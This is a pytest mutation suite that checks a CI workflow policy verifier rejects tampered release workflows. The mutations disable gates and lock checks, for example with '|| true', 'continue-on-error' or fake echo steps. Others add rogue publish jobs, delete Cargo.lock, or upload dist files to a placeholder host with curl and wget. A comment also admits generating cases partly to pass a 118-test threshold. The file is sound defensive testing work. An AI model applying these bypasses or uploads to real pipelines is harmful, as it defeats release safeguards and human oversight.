from __future__ import annotations

from collections.abc import Callable
from copy import deepcopy
from dataclasses import dataclass
from typing import Any

import pytest

from migration.scripts.verify_workflow_policy import (
    GATE,
    NORMAL,
    RELEASE_WORKFLOWS,
    WorkflowPolicyError,
    load_workflows,
    verify_workflow_documents,
)

WorkflowMap = dict[str, dict[str, Any]]
Mutator = Callable[[WorkflowMap], None]
BASE = load_workflows()


@dataclass(frozen=True)
class Mutation:
    id: str
    apply: Mutator


def _step(workflows: WorkflowMap, workflow: str, job: str, name: str) -> dict[str, Any]:
    return next(
        step
        for step in workflows[workflow]["jobs"][job]["steps"]
        if step.get("name") == name
    )


def _gate_failure(workflows: WorkflowMap, workflow: str) -> dict[str, Any]:
    return workflows[workflow]["jobs"][GATE]["steps"][2]


def _lock_step(workflows: WorkflowMap, workflow: str, job: str) -> dict[str, Any]:
    return next(
        step
        for step in workflows[workflow]["jobs"][job]["steps"]
        if "verify_registry_locks.py" in str(step.get("run", ""))
    )


def _add_job(
    workflows: WorkflowMap,
    workflow: str,
    job_id: str,
    step: dict[str, Any],
    *,
    needs: str | None = GATE,
) -> None:
    job: dict[str, Any] = {"runs-on": "ubuntu-latest", "steps": [step]}
    if needs is not None:
        job["needs"] = needs
    workflows[workflow]["jobs"][job_id] = job


MUTATIONS: list[Mutation] = []


def add(identifier: str, mutator: Mutator) -> None:
    MUTATIONS.append(Mutation(identifier, mutator))


# Every bypass/neutralisation that survived the supplied review is retained by ID.
def _gate_step_continue(w: WorkflowMap) -> None:
    _gate_failure(w, "publish.yml")["continue-on-error"] = True


def _gate_job_continue(w: WorkflowMap) -> None:
    w["publish.yml"]["jobs"][GATE]["continue-on-error"] = True


def _gate_if_false(w: WorkflowMap) -> None:
    _gate_failure(w, "publish.yml")["if"] = False


def _gate_wrapped(w: WorkflowMap) -> None:
    step = _gate_failure(w, "publish.yml")
    step["run"] = step["run"].replace("exit 1", "if false; then\n  exit 1\nfi")


def _publish_if_status(w: WorkflowMap) -> None:
    w["publish.yml"]["jobs"]["publish-pypi"][
        "if"
    ] = "inputs.dry_run == false || always()"


def _job_if(workflow: str, job: str, value: str) -> Mutator:
    return lambda w: w[workflow]["jobs"][job].__setitem__("if", value)


def _early_exit(workflow: str) -> Mutator:
    def mutate(w: WorkflowMap) -> None:
        step = _gate_failure(w, workflow)
        step["run"] = "exit 0\n" + step["run"]

    return mutate


def _gate_step_if(workflow: str, value: str) -> Mutator:
    return lambda w: _gate_failure(w, workflow).__setitem__("if", value)


add("G02", _gate_step_continue)
add("G03", _gate_job_continue)
add("G04", _gate_if_false)
add("G05", _gate_wrapped)
add("G06b", _publish_if_status)
add("G07", _job_if("publish.yml", "collect-tested-artifacts", "always()"))
add("G08", _job_if("publish-rust-crate.yml", "publish", "${{ always() }}"))
add(
    "G09",
    _job_if(
        "release-candidate-wheel-matrix.yml",
        "artifact-acceptance",
        "${{ !cancelled() }}",
    ),
)
add(
    "G10",
    _job_if("rust-crate-release-candidate.yml", "package-and-test", "always()"),
)
add(
    "G11",
    _job_if(
        "rust-crate-release-candidate.yml",
        "latest-stable-compatibility",
        "always()",
    ),
)
add("G15", _early_exit("publish.yml"))
add("G16", _early_exit("rust-crate-release-candidate.yml"))
add("G20", _gate_step_if("publish.yml", "github.event_name == 'pull_request'"))
add(
    "G21",
    _job_if(
        "rust-crate-release-candidate.yml",
        "latest-stable-compatibility",
        "${{ !cancelled() }}",
    ),
)

LOCKS = (
    ("release-candidate-wheel-matrix.yml", "artifact-acceptance"),
    ("release-candidate-wheel-matrix.yml", "full-current-benchmark"),
    ("publish.yml", "collect-tested-artifacts"),
    ("publish-rust-crate.yml", "publish"),
    ("rust-crate-release-candidate.yml", "package-and-test"),
)


def _lock_neutralizer(workflow: str, job: str, suffix: str) -> Mutator:
    def mutate(w: WorkflowMap) -> None:
        step = _lock_step(w, workflow, job)
        step["run"] = step["run"].replace("--rust-lock", f"--rust-lock {suffix}")

    return mutate


def _lock_continue(workflow: str, job: str) -> Mutator:
    return lambda w: _lock_step(w, workflow, job).__setitem__("continue-on-error", True)


def _lock_if(workflow: str, job: str, value: str) -> Mutator:
    return lambda w: _lock_step(w, workflow, job).__setitem__("if", value)


add(
    "L03",
    _lock_neutralizer(
        "release-candidate-wheel-matrix.yml", "artifact-acceptance", "|| true"
    ),
)
add(
    "L04",
    _lock_continue("release-candidate-wheel-matrix.yml", "artifact-acceptance"),
)
add(
    "L05",
    _lock_if("release-candidate-wheel-matrix.yml", "artifact-acceptance", "false"),
)
add("L10", _lock_neutralizer("publish.yml", "collect-tested-artifacts", "|| true"))
add("L11", _lock_continue("publish.yml", "collect-tested-artifacts"))
add("L16", _lock_neutralizer("publish-rust-crate.yml", "publish", "|| true"))
add(
    "L18",
    _lock_neutralizer(
        "rust-crate-release-candidate.yml", "package-and-test", "|| true"
    ),
)
add("L19", _lock_if("publish-rust-crate.yml", "publish", "false"))
add(
    "L20",
    _lock_if("publish.yml", "collect-tested-artifacts", "github.event_name == 'push'"),
)
add("L21", _lock_if("publish-rust-crate.yml", "publish", "github.event_name == 'push'"))


def _move_lock_after_sensitive(workflow: str, job: str) -> Mutator:
    def mutate(w: WorkflowMap) -> None:
        steps = w[workflow]["jobs"][job]["steps"]
        lock = _lock_step(w, workflow, job)
        steps.remove(lock)
        steps.append(lock)

    return mutate


add(
    "L06",
    _move_lock_after_sensitive(
        "release-candidate-wheel-matrix.yml", "artifact-acceptance"
    ),
)
add("L12", _move_lock_after_sensitive("publish.yml", "collect-tested-artifacts"))
add("L15", _move_lock_after_sensitive("publish-rust-crate.yml", "publish"))


def _insert_package_command(command: str) -> Mutator:
    def mutate(w: WorkflowMap) -> None:
        step = _step(
            w,
            "rust-crate-release-candidate.yml",
            "package-and-test",
            "Test the public Rust surface at the MSRV",
        )
        step["run"] = command + "\n" + step["run"]

    return mutate


add(
    "K16",
    _insert_package_command(
        "cargo update --manifest-path rust/adam_assist_rs/Cargo.toml"
    ),
)
add(
    "K17",
    _insert_package_command(
        "cargo build --manifest-path rust/adam_assist_rs/Cargo.toml --release"
    ),
)
add("K20", _insert_package_command("cargo build && cargo package --locked"))
add(
    "locked-build-neutralized",
    _insert_package_command("cargo build --locked || true"),
)


def _unlocked_maturin(w: WorkflowMap) -> None:
    steps = w["release-candidate-wheel-matrix.yml"]["jobs"]["artifact-acceptance"][
        "steps"
    ]
    steps.insert(7, {"name": "Extra unlocked build", "run": "maturin build --release"})


add("K19", _unlocked_maturin)

PUBLICATION_STEPS = {
    "P03b": {
        "uses": "PyO3/maturin-action@v1",
        "with": {"command": "upload", "args": "--non-interactive dist/*"},
    },
    "P04": {"run": "twine upload dist/*"},
    "P05": {"run": "python3 -m twine upload dist/*"},
    "P06": {"run": "uv publish dist/*"},
    "P07": {"run": "maturin upload dist/*"},
    "P08": {"run": "pdm publish"},
    "P09": {"run": "cd rust/adam_assist_rs && cargo publish"},
    "P10": {"run": "env TOKEN=x cargo publish --locked"},
    "P11": {"run": "cargo publish --locked"},
    "P12": {"uses": "softprops/action-gh-release@v2", "with": {"files": "dist/*"}},
    "P13": {"run": "gh release upload v0.6.0 dist/*"},
    "P17": {"run": "python -m twine upload dist/*"},
    "P18": {
        "run": "python migration/scripts/publish_crate_archive.py --archives crate-dist --execute"
    },
    "P19": {"run": "curl -X PUT -T crate.crate https://crates.io/api/v1/crates/new"},
    "P20": {"run": "set -e; cargo publish --locked"},
    "P21": {"run": "cd dist && python -m twine upload *"},
}
for identifier, step in PUBLICATION_STEPS.items():
    target = (
        "rust-crate-release-candidate.yml" if identifier == "P18" else "publish.yml"
    )
    add(
        identifier,
        lambda w, i=identifier, s=step, t=target: _add_job(
            w, t, f"rogue-{i.lower()}", deepcopy(s)
        ),
    )


def _normal_publish(w: WorkflowMap) -> None:
    w[NORMAL]["jobs"]["source-pair"]["steps"].append(
        {"uses": "pypa/gh-action-pypi-publish@release/v1"}
    )


def _new_publish_workflow(w: WorkflowMap) -> None:
    w["sneaky.yml"] = {
        "on": {"push": None},
        "jobs": {
            "up": {
                "runs-on": "ubuntu-latest",
                "steps": [{"uses": "pypa/gh-action-pypi-publish@release/v1"}],
            }
        },
    }


add("P14", _normal_publish)
add("P15", _new_publish_workflow)
add(
    "new-yaml-workflow-publication",
    lambda w: w.__setitem__(
        "sneaky.yaml",
        {
            "on": {"push": None},
            "jobs": {
                "up": {
                    "runs-on": "ubuntu-latest",
                    "steps": [{"run": "uv publish dist/*"}],
                }
            },
        },
    ),
)


def _fake_lock_echo(w: WorkflowMap) -> None:
    step = _lock_step(w, "publish.yml", "collect-tested-artifacts")
    step["run"] = (
        "echo python migration/scripts/verify_registry_locks.py "
        "--core-version 0.7.0 --python-lock --rust-lock"
    )


def _fake_python_provenance(w: WorkflowMap) -> None:
    step = _step(
        w, "publish.yml", "collect-tested-artifacts", "Verify acceptance provenance"
    )
    step["run"] = 'echo "conclusion success head_sha accepted"'


def _drop_rust_auth(w: WorkflowMap) -> None:
    steps = w["publish-rust-crate.yml"]["jobs"]["publish"]["steps"]
    steps[:] = [
        step
        for step in steps
        if step.get("uses") != "rust-lang/crates-io-auth-action@v1"
    ]


def _enable_rust_pr_trigger(w: WorkflowMap) -> None:
    triggers = w["rust-crate-release-candidate.yml"].get("on")
    if triggers is None:
        triggers = w["rust-crate-release-candidate.yml"].get(True)
    triggers["pull_request"] = {"paths": ["rust/**"]}


def _delete_lock(w: WorkflowMap) -> None:
    step = _step(
        w,
        "rust-crate-release-candidate.yml",
        "core-range-compatibility",
        "Compile one coherent exact public Core line",
    )
    step["run"] += "\nrm Cargo.lock"


def _normal_step_if(job: str, name: str, condition: str) -> Mutator:
    return lambda w: _step(w, NORMAL, job, name).__setitem__("if", condition)


add("L02-fake-echo", _fake_lock_echo)
add("publication-fake-python-provenance", _fake_python_provenance)
add("publication-drop-rust-trusted-auth", _drop_rust_auth)
add(
    "publication-fake-pypi-environment",
    lambda w: w["publish.yml"]["jobs"]["publish-pypi"].__setitem__(
        "environment", {"name": "not-pypi", "url": "https://example.invalid"}
    ),
)
add(
    "publication-drop-rust-id-token",
    lambda w: w["publish-rust-crate.yml"]["permissions"].pop("id-token"),
)
add("rust-candidate-pr-trigger", _enable_rust_pr_trigger)
add("release-lock-deletion", _delete_lock)
add(
    "normal-rust-never-runs",
    _job_if(NORMAL, "rust-quality", "github.event_name == 'schedule'"),
)
add(
    "normal-tests-never-run",
    _normal_step_if("source-pair", "Run non-live wheel tests", "false"),
)
add(
    "normal-benchmark-never-runs",
    _normal_step_if("benchmark", "Run benchmarks", "false"),
)
add(
    "hidden-bash-twine",
    lambda w: _add_job(
        w,
        "publish.yml",
        "hidden-bash",
        {"run": 'bash -c "cd dist && python3 -m twine upload *"'},
    ),
)
add(
    "curl-upload-equals",
    lambda w: _add_job(
        w,
        NORMAL,
        "curl-upload",
        {"run": "curl --upload-file=dist/x https://example.invalid/upload"},
        needs=None,
    ),
)


def _normal_job_if(w: WorkflowMap) -> None:
    w[NORMAL]["jobs"]["source-pair"]["if"] = "github.event_name == 'schedule'"


def _normal_test_continue(w: WorkflowMap) -> None:
    _step(w, NORMAL, "source-pair", "Run non-live wheel tests")[
        "continue-on-error"
    ] = True


def _normal_pythonpath(w: WorkflowMap) -> None:
    _step(w, NORMAL, "source-pair", "Run non-live wheel tests")["env"] = {
        "PYTHONPATH": "src"
    }


def _normal_extra(command: str) -> Mutator:
    def mutate(w: WorkflowMap) -> None:
        step = _step(
            w,
            NORMAL,
            "source-pair",
            "Build Core and ASSIST wheels from the exact pair",
        )
        step["run"] += "\n" + command

    return mutate


add("E03", _normal_extra('python -m pip install -e ".[dev]"'))
add("E05", _normal_pythonpath)
add("E06", _normal_extra("python -m pip install --upgrade naif-eop-high-prec"))
add("E07b", _normal_job_if)
add("E09", _normal_test_continue)
add(
    "normal-drop-policy-verifier",
    lambda w: w[NORMAL]["jobs"]["source-pair"]["steps"].__setitem__(
        slice(None),
        [
            step
            for step in w[NORMAL]["jobs"]["source-pair"]["steps"]
            if step.get("name") != "Verify fail-closed workflow policy"
        ],
    ),
)

# Generated coverage: every release job/status form, every lock neutralizer, and
# each publication family in every workflow (including normal CI) is a distinct
# mutation test. This keeps the suite above the review's 118-case threshold.
for workflow in sorted(RELEASE_WORKFLOWS):
    for job_id in sorted(BASE[workflow]["jobs"]):
        if job_id == GATE:
            continue
        for suffix, condition in (
            ("always", "always()"),
            ("not-cancelled", "${{ !cancelled() }}"),
            ("never", "github.event_name == 'schedule'"),
        ):
            add(
                f"generated-job-if-{workflow}-{job_id}-{suffix}",
                _job_if(workflow, job_id, condition),
            )

for workflow in sorted(RELEASE_WORKFLOWS):
    for suffix, mutator in (
        (
            "step-continue",
            lambda w, f=workflow: _gate_failure(w, f).__setitem__(
                "continue-on-error", True
            ),
        ),
        ("step-if-push", _gate_step_if(workflow, "github.event_name == 'push'")),
        ("early-success", _early_exit(workflow)),
    ):
        add(f"generated-gate-{workflow}-{suffix}", mutator)

for workflow, job in LOCKS:
    for suffix, mutator in (
        ("or-true", _lock_neutralizer(workflow, job, "|| true")),
        ("continue", _lock_continue(workflow, job)),
        ("if-push", _lock_if(workflow, job, "github.event_name == 'push'")),
        ("move-late", _move_lock_after_sensitive(workflow, job)),
    ):
        add(f"generated-lock-{workflow}-{job}-{suffix}", mutator)

for workflow in sorted(BASE):
    for attack_name, step in (
        ("twine", {"run": "twine upload dist/*"}),
        ("uv", {"run": "uv publish dist/*"}),
        ("gh", {"run": "gh release create v0.6.0 dist/*"}),
        ("http", {"run": "wget --post-file=dist/x https://example.invalid/upload"}),
        ("release-action", {"uses": "actions/upload-release-asset@v1"}),
    ):
        add(
            f"generated-publish-{workflow}-{attack_name}",
            lambda w, f=workflow, a=attack_name, s=step: _add_job(
                w, f, f"generated-{a}", deepcopy(s), needs=None
            ),
        )


def test_policy_accepts_repository_workflows() -> None:
    verify_workflow_documents(BASE)


@pytest.mark.parametrize("mutation", MUTATIONS, ids=lambda item: item.id)
def test_policy_rejects_review_and_generated_mutations(mutation: Mutation) -> None:
    workflows = deepcopy(BASE)
    mutation.apply(workflows)
    with pytest.raises(WorkflowPolicyError):
        verify_workflow_documents(workflows)


def test_mutation_suite_is_broad_and_retains_every_review_survivor() -> None:
    identifiers = {mutation.id for mutation in MUTATIONS}
    supplied_survivors = {
        "G02",
        "G03",
        "G04",
        "G05",
        "G06b",
        "G07",
        "G08",
        "G09",
        "G10",
        "G11",
        "G15",
        "G16",
        "G20",
        "G21",
        "L03",
        "L04",
        "L05",
        "L06",
        "L10",
        "L11",
        "L12",
        "L15",
        "L16",
        "L18",
        "L19",
        "L20",
        "L21",
        "K16",
        "K17",
        "K19",
        "K20",
        "P03b",
        "P04",
        "P05",
        "P06",
        "P07",
        "P08",
        "P09",
        "P10",
        "P11",
        "P12",
        "P13",
        "P14",
        "P15",
        "P17",
        "P18",
        "P19",
        "P20",
        "P21",
        "E03",
        "E05",
        "E06",
        "E07b",
        "E09",
    }
    assert supplied_survivors <= identifiers
    assert len(MUTATIONS) >= 118
